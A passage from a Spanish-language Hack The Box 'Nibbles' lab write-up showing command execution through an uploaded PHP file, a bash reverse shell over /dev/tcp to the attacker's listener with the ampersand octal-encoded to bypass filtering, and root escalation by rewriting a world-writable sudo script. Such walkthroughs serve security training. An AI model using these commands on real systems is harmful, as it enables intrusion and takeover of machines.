+<p>Vamos a seleccionar nuestro archivo y tratar de ejecutar algún comando a nivel de sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd<span class="o">=</span><span class="nb">whoami</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-nibbles/nibbles-web10.png" alt=""></p>
+
+<p>Tenemos ejecución de comandos a nivel de sistema, por lo tanto, trataremos de entablarnos una reverse shell; así que nos podremos en escucha por el puerto 443 y ejecutamos nuestro comando. Si tratamos varias veces, vemos que no podemos entablarnos la reverse shell, esto se debe a que existen caracteres que al servidor no le gusta; por lo tanto vamos a probar de ver que caracteres son utilizando <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.14.27/443 0&gt;&amp;1</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd<span class="o">=</span><span class="nb">echo</span> <span class="s2">"/"</span>
+http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd<span class="o">=</span><span class="nb">echo</span> <span class="s2">"&amp;"</span>
+http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd<span class="o">=</span><span class="nb">echo</span> <span class="s2">"&gt;"</span>
+http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd<span class="o">=</span><span class="nb">echo</span> <span class="s2">"-"</span>
+</code></pre></div></div>
+
+<p>El único caracter que no vemos es <strong>&amp;</strong>; por lo tanto vamos a declarar una variable cuyo valor lo expresaremos en forma octal de dicho caracter (046 - lo obtenemos de <code class="language-plaintext highlighter-rouge">man ascii</code>).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nv">ampersan</span><span class="o">=</span><span class="si">$(</span><span class="nb">printf</span> <span class="s1">'\046'</span><span class="si">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$ampersan</span>
+&amp;
+</code></pre></div></div>
+
+<p>Por lo tanto, nuestra reverse shell nos quedaría de la siguiente forma:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ampersan</span><span class="o">=</span><span class="si">$(</span><span class="nb">printf</span> <span class="s1">'\046'</span><span class="si">)</span><span class="p">;</span> bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;</span><span class="nv">$ampersan</span><span class="s2"> /dev/tcp/10.10.14.27/443 0&gt;</span><span class="nv">$ampersan</span><span class="s2"> 1"</span>
+</code></pre></div></div>
+
+<p>Nos ponemos en escucha por el puerto 443 y ejecutamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd<span class="o">=</span><span class="nv">ampersan</span><span class="o">=</span><span class="si">$(</span><span class="nb">printf</span> <span class="s1">'\046'</span><span class="si">)</span><span class="p">;</span> bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;</span><span class="nv">$ampersan</span><span class="s2"> /dev/tcp/10.10.14.27/443 0&gt;</span><span class="nv">$ampersan</span><span class="s2"> 1"</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.75] 37836
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1372<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image<span class="nv">$ </span><span class="nb">whoami</span>
+&lt;ml/nibbleblog/content/private/plugins/my_image<span class="nv">$ </span><span class="nb">whoami                      
+</span>nibbler
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ya nos encontramos dentro de la máquina, pero antes, vamos a realizar un <a href="/tratamiento-tty">Tratamiento de la tty</a>. Somos el usuario <strong>nibbler</strong> y podemos visualizar la flag (user.txt), por lo que ahora vamos a enumerar un poco el sistema para ver de que forma nos podemos convertir en <strong>root</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nibbler@Nibbles:/home/nibbler<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>nibbler<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nibbler<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>nibbler<span class="o">)</span>
+nibbler@Nibbles:/home/nibbler<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>nibbler on Nibbles:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+nibbler@Nibbles:/home/nibbler<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que podemos ejecutar <code class="language-plaintext highlighter-rouge">/home/nibbler/personal/stuff/monitor.sh</code> como el usuario <strong>root</strong> sin proporcionar contraseña; por lo tanto vamos a ver los permisos que disponemos sobre el script.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nibbler@Nibbles:/home/nibbler<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 8
+<span class="nt">-r--------</span> 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
+<span class="nt">-r--------</span> 1 nibbler nibbler   33 Mar 18 02:36 user.txt
+nibbler@Nibbles:/home/nibbler<span class="nv">$ </span>unzip personal.zip 
+Archive:  personal.zip
+   creating: personal/
+   creating: personal/stuff/
+  inflating: personal/stuff/monitor.sh  
+nibbler@Nibbles:/home/nibbler<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 12
+drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 personal
+<span class="nt">-r--------</span> 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
+<span class="nt">-r--------</span> 1 nibbler nibbler   33 Mar 18 02:36 user.txt
+nibbler@Nibbles:/home/nibbler<span class="nv">$ </span><span class="nb">cd </span>personal
+nibbler@Nibbles:/home/nibbler/personal<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 4
+drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 stuff
+nibbler@Nibbles:/home/nibbler/personal<span class="nv">$ </span><span class="nb">cd </span>stuff/
+nibbler@Nibbles:/home/nibbler/personal/stuff<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 4
+<span class="nt">-rwxrwxrwx</span> 1 nibbler nibbler 4015 May  8  2015 monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Tenemos permisos de lectura, escritura y ejecución, por lo tanto vamos a cambiar el contenido de dicho script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nibbler@Nibbles:/home/nibbler/personal/stuff<span class="nv">$ </span><span class="nb">cat </span>monitor.sh 
+<span class="c">#!/bin/bash</span>
+
+/bin/bash
+nibbler@Nibbles:/home/nibbler/personal/stuff<span class="nv">$ </span><span class="nb">sudo</span> /home/nibbler/personal/stuff/monitor.sh
+root@Nibbles:/home/nibbler/personal/stuff# <span class="nb">whoami
+</span>root
+root@Nibbles:/home/nibbler/personal/stuff#
+</code></pre></div></div>
+
+<p>Ya somos el usuario <strong>root</strong> y podemos visualizar al flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#file-misconfiguration" class="page__taxonomy-item" rel="tag">File_Misconfiguration</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-03-18T00:00:00-06:00">March 18, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-celestial/" class="pagination--pager" title="Hack The Box Celestial
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
